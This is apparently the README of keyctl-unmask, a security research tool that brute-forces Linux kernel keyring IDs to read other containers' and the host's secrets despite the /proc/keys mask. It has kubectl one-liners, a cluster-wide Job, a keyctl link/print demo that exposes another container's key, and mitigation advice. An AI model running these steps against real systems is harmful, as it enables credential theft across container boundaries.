# Keyctl-demask

This tool aims to unmask keychains and keys used by the Linux kernel from 
within a container. 

## Background 

Container security folks have known that keyctl usage within containers 
is a risky operation because there is no inherent way to isolate the Linux Kernel's
keyrings and keys that often store sensitive content. 

the `keyctl()` syscall allows a user to interact with Linux kernel keyrings
which store sensitive information per user, session, threat, or process (among
others). These keyrings are used by different applications and are usually in
`/proc/keys`. 

For containers, this was deemed a security risk ( and you might agree ) because you
don't want your containers to be able to see your hosts' keys/keyrings or other
containers' keyrings.  
pipkill t

On part of the original fix for this was to simply "mask" `/proc/keys` so that `cat
/proc/keys` would return no results. 

**This tool Goes Florida on those masks.**

In reality, the mask just obfuscates the keys and you're free to 
issue syscalls to the kernel requesting any
keys you'd like. (Free as in Florida) 
So here we're:

* brute forcing an `int32` to guess the keyring ID's 
* asking the Linux kernel for information about the keyring, 
* if they're found try to "Possess" them and subsequently read the keys of other containers
* ... and even worse, the host

Let me be clear, there is an easy solution to this problem (seccomp, user
namespaces, compile time restrictions) and it's been known for years, but just
like Florida's mask policy, we've decided that we don't need these things all
the time because we need developers to have the freedom to develop without the
hindrence of security.

The most damaging scenario that I know of today for using this tool is 
if you were crazy enough to deploy Kerberos into Kubernetes and configure
it to use the KEYCTL credential storage. 

## Usage 

From within a container simply running `keyctl-unmask` will run like this:

![docker demo](/example/docker_demo.gif)

~~~bash
Search for Linux kernel keyrings even if /proc/keys are masked in a container
Usage: 

        keyctl-unmask -min 0 -max 999999999 

        keyctl-unmask -hunt

        keyctl-unmask -stderrthreshold=Info

  -hunt
        Enable brute force mode to search for key ids (default true)
  -key int
        Specific key ID to test (int32)
  -logtostderr
        log to standard error instead of files
  -max int
        Max key id range (default 999999999)
  -min int
        Minimum key id range (default 1)
  -output string
        Output path (default "./keyctl_ids")
  -stderrthreshold value
        logs at or above this threshold go to stderr
~~~

## Usage In Kubernetes

Most Kubernetes clusters have the "benefit" of running without seccomp enabled so
you can it like so:

```shell
kubectl run --rm -i \
      -t keyctl-unmask --image=keyctl-unmask \
      --image-pull-policy=Never --restart=Never \
      -- keyctl-unmask -hunt  
```

### Kubernetes One Off Pod With Progress Bar

The following one liner will start a hunt into the kubernetes cluster and 
return the results with the progress bar in a clean way. 

~~~shell
kubectl run whatever --rm -it --generator=Pod --image-pull-policy=Never \
      --restart=Never --image=antitree/keyctl-unmask \
      --overrides="$(cat example/k8s/keyctl-unmask-run.json)"
~~~

## Projects With Keyctl Related Code

Here are some other projects that seem to be using keyctl syscalls (but don't hate on them, IDK if they need to run in containers):

* `azcopy` for Azure
* [This container image processing library](https://github.com/containers/image/blob/21244c96ad792ef415068dc1bc1ab82dffb68dc3/pkg/docker/config/config_linux.go)
* systemd unit files
* [trezord](https://github.com/trezor/trezor-core/blob/master/tools/keyctl)
* [neo4j](https://github.com/neo4j-apps/neo4j-desktop/wiki/Troubleshooting-(Linux))
* [kerberos](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux)
* [cyberark](https://docs.cyberark.com/Product-Doc/OnlineHelp/AAM-DAP/Latest/en/Content/Deployment/MasterKeyEncryption/serverkeyencryption.html)
* sssd-common
* nfs-common
* ceph-common
* libecryptfs1
* ecryptfs-utils
* cifs-utils
* [Google fscryptctl](https://github.com/google/fscryptctl/blob/142326810eb19d6794793db6d24d0775a15aa8e5/fscryptctl.c#L100)

## Demo Docker

In one container, create a new key representing a secret stored by a container:

~~~shell
docker run --name secret-server -it --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash \
> keyctl add user antitrees_secret thetruthisiliketrees @s
123456789
> keyctl show
Session Keyring
 899321446 --alswrv      0     0  keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
 911117332 --alswrv      0     0   \_ user: antitrees_secret
~~~

If we were cheating, we could see that we have a session keyring ID of 899321446
and a user key ID of 911117332. The secret is in the key but we can't access the
key without linking the session. 

Start a separate container and attach a shell so we can test some things

~~~shell
docker run -it --name keyctl-attacker --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash
~~~

To begin, lets prove that Docker is masking the `/proc/keys` path:

~~~shell
root@keyctl-attacker:/# cat /proc/keys
root@keyctl-attacker:/# 
~~~

Nothing. Because it's masked by an overmount. 

The `keyctl` tool is designed to let us interact with keyrings and keys in Linux, this demonstrates the problem:


Show me the current user's session:

~~~shell
root@keyctl-attacker:/# keyctl show
Session Keyring
 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
~~~

To demonstrate the problem, I'm going to show you what happens even if you know the key ID of the secret:

~~~shell
root@keyctl-attacker:/# keyctl print 123456789
keyctl_read_alloc: Permission denied
~~~

But why? I thought we said we're root and everything isn't isolated. The problem
here is that we don't "Possess" the key which means the key/keyring isn't in one
of the keyrings our account uses (@s, @us, @u, @p, @t,...).  In order to Possess
the key, we have to Link the key's parent Keyring to a Keyring that we own. 

Again, if you know the key ID's here how you could link the parent keyring to
your session keyring, show the keys, and then print the key we really wanted
access to . 

~~~shell
root@keyctl-attacker:/# keyctl link 899321446 @s
root@keyctl-attacker:/# keyctl show
Session Keyring
 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
 899321446 --alswrv      0     0   \_ keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
 911117332 --alswrv      0     0       \_ user: antitrees_secret
root@keyctl-attacker:/# keyctl print 911117332
thetruthisiliketrees
~~~

...But you don't know the user key ID or, more importantly the keyring ID. This
is a problem that `keyctl-unmask` fixes. We don't know the parent keyring ID...
so lets guess it!

~~~shell
root@keyctl-attacker:/# keyctl-unmask -min 0 -max 999999999
10 / 10 [----------------------------------------------------------------------------] 100.00% ? p/s 0s
Output saved to:  ./keyctl_ids
root@keyctl-attacker:/# cat keyctl_ids 
~~~

~~~json
{
 "KeyId": 899321446,
 "Valid": true,
 "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
 "Type": "keyring",
 "Uid": "0",
 "Gid": "0",
 "Perms": "3f1b0000",
 "String_Content": "\u0014\ufffdN6",
 "Byte_Content": "FIxONg==",
 "Comments": null,
 "Subkeys": [
  {
   "KeyId": 911117332,
   "Valid": true,
   "Name": "antitrees_secret",
   "Type": "user",
   "Uid": "0",
   "Gid": "0",
   "Perms": "3f010000",
   "String_Content": "thetruthisiliketrees",
   "Byte_Content": "dGhldHJ1dGhpc2lsaWtldHJlZXM=",
   "Comments": null,
   "Subkeys": null
  }
 ]
~~~

## Demo Kubernetes 

Deploying as a Job will run this on each node in the cluster to let you figure out 
if any cluster has interesting things within each Node. This creates a PVC to store
the results of each Node's keychain. 

```bash
keyctl apply -f examples/k8s/keyctl-unmask-job.yaml
```

Attach to the debug Pod to read the results:

```bash
kubectl exec -it -n test keyctl-unmask-debug-pod -- /bin/bash
> cat /keyctl-output/$NODE_NAME
{
 "KeyId": 899321446,
 "Valid": true,
 "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
 "Type": "keyring",
...
```



## History of Containers and KEYCTL Syscall

The history of this issue goes like this:

1. Docker did not protect /proc/keys at all allowing all users to access the host keys
1. Someone finds a memory corruption [bug](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9529) WRT the `keyctl()` syscall
1. Jesse Frazelle sees this issue and fixes it with a seccomp profile (that is sometimes disabled)
1. Docker realized that this should be protected so they add a mask over /proc/keys so that if you were to `cat /proc/keys` you wouldn't see it
1. In 2016, `stefanberger` thinks that each container should create its own session key. An [Epic Discussion is had](https://github.com/opencontainers/runc/pull/488). Concluding with:
   > "With the patch, each container gets its own session keyring. However, it does work better with user namespaces enabled than without it. With user namespaces each container has its own session keyring _ses and a 'docker exec' joins this session keyring. **Without user namespaces enabled, each container also gets a session keyring on 'docker run' but a 'docker exec' again joins the first created session keyring so that containers share it.** The advantage still is that it's not a keyring shared with the host, even though in the case that user namespaces are not enabled, the containers end up sharing a session keyring upon 'docker exec.'"
1. Jesse Frazelle requests an option to disable the mask so she can do sketchy things in her custom container based FrazelleOS. The option is called [Masked Paths](https://github.com/moby/moby/pull/36644/files). 
1. This is part of moby OCI defaults as the [MaskedPaths spec](https://github.com/moby/moby/blob/10866714412aea1bb587d1ad14b2ce1ba4cf4308/oci/defaults.go) but isn't exposed via Docker. 
1. In 2019, the Linux Kernel adds support for [Keys Namespaces](https://lwn.net/Articles/779895/) but Moby does not support it. 

The current state is that seccomp successfully defends from any risk here but it's a secondary security control so not a robust solution. 
(*cough Kubernetes *cough)  
User-Namespacing again will again save the day because a seperate namespace is created which includes one for a keyring -- but this isn't enabled by default.

So we're back at where we were in 2016, containers using the keyring have a shared session keyring and inherently share private information with eachother. 


## Further Reading

* [Blog About this Issue in 2014](https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/)
* [Overview and Recent Developers of Keyrings Subsystem](https://www.youtube.com/watch?v=KUCwiQZuasA)
* [Indepth discussion on keys and how Posession works and is important](https://mjg59.dreamwidth.org/37333.html)
* [keyctl(2) Syscall Man Page](https://man7.org/linux/man-pages/man2/keyctl.2.html)
* [keyctl from keyutils usage page](https://manpages.debian.org/stretch/keyutils/keyctl.1.en.html)
* [Linux Kernel Keys and Keyrings Documentation](https://www.kernel.org/doc/Documentation/security/keys.txt)
* [Example using keyctl to access keys](https://davids-blog.gamba.ca/posts/caching-credentials-linux-keyring-golang/)a
* [IBM Blog covers syscalls used by keyctl](https://www.ibm.com/developerworks/library/l-key-retention/index.html)
* [Linux Kernel Trusted and Encrypted Docs](https://www.kernel.org/doc/Documentation/security/keys-trusted-encrypted.txt)
* 

## Known Issues

* In minikube (and likely other non-standard linux OS's) the `get_persistent` keyctl SYSCALL isn't supported. From minikube host for example: `keyctl get_persistent @s -1`

## Pre-Emptive Responses To Potential Questions/Comments

**What's you're deal with Florida?**
IDK, just not feeling like a fan lately.

**Yeah but the Docker seccomp profile takes care of this.**

First, yes seccomp-bpf is a powerful tool and we should all use it for our containers but in the case of Docker, it's considered
a nice-to-have (not to mention difficult to use at scale). Because it's not a primary security control, and because there's no way 
to validate whether a seccomp profile is effective at runtime (see my other talks), we can't rely on it. It's a bolt on fix for the
real issue. 

**We should just enable user namespacing and this would be solved**

If you say that all you have to do is enable user namespacing, I'd say "You're right!" and "No one does" and "It's not the default for Docker"
Lets not say that user namespacing is a solution when enabling it breaks so many other things. 

**Everyone knows about this issue, this isn't new**

That this isn't new is mostly true in that it's been discussed since 2014 but it's been considered generally fixed since 
we added masks to `/proc/keys` and fixed it via seccomp. 

**No one uses keyrings**

That seems to be true for many things but I think it's interesting that the technology is completely incompatible with
containers in that every container can access any other container's keyrings including the hosts. 

**Fine well what do you want someone to do about it?**

1. Ensure that your container runtimes have support for namespaced keyrings: [It's possible](https://lwn.net/Articles/779895/), if anyone cares.
2. Make some of the protections that seccomp provides like blocking `KEYCTL` syscalls completely a compiled in security control .
3. Make seccomp usable in our runtimes. (See separate rant)